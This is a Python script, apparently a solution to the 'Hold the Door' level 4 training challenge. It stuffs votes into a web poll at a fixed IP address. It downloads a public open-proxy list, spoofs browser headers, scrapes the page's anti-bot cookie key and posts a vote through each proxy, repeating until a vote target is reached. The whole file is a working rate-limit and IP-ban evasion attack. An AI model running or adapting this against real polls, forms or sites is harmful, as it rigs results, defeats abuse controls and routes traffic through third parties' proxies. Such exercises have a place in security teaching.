#!/usr/bin/python3
'''Module for Hodor level 4 challenge'''
import requests
#from bs4 import BeautifulSoup
import re
import time

try:
   ID = int(input("Input number the ID: "))
except ValueError:
   print("PLEASE: input number integer.")
   exit(98)
votes = 98
success = 'Hold the Door challenge - Level 4'
ok = 0
fail = 0
url = 'http://158.69.76.135/level4.php'
data = {'id': ID, 'holdthedoor': 'Submit'}
referer = url
headerwin = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36'
headers = {"User-Agent": headerwin, "Referer": url}

#download http proxy
proxlist = set()
s = requests.Session()
q = s.get('http://spys.me/proxy.txt')
proxma1 = q.text.split()
for j in (proxma1):
   if ":" in j:
      proxlist.add(j)

#from txt local
#with open("prox.txt", 'r') as f:
#   proxlist=f.read().splitlines()
response = s.get(url, headers=headers)

txt = response.text.split()
txtid = txt.index(str(ID))
if ((txt[txtid+3]).isdigit()):
       votescurrent = int(txt[txtid+3])
print(headers)
print("------------------------------------------------------------------")
print("Hello Alzheimeer: ID: {}, VOTES CURRENT: {} -- 98Votes\
".format(ID, votescurrent))
print("------------------------------------------------------------------")
print(success)
print("------------------------------------------------------------------")

for e, ip in enumerate(proxlist):
   try:
      response = s.get(url, headers=headers)
      if response.status_code is not 200:
         continue
      key = response.cookies['HoldTheDoor']
      data["key"] = key
      cookie = {"HoldTheDoor": key}

      response = s.post(url, headers=headers, data=data,\
                        proxies={"http": "http://" + ip}, timeout=5)
      if response.status_code is 200 and success in response.text:
          ok += 1
          votescurrent += 1
          print("{} ok   Ip:{}".format(ok, ip), end='\r', flush=True)
   except Exception as e:
      fail += 1
      print("{} Fail Ip:{}".format(fail, ip), end='\r', flush=True)

   finally:
      if ok >= votes or fail >= 100 or votescurrent == 98:
         break

print()
print("--------------------------------------------------------------------")
print("Finally Alzheimeer: Ok {}, Fail {}, Votes {}".format(ok, fail, votes))
print("--------------------------------------------------------------------")
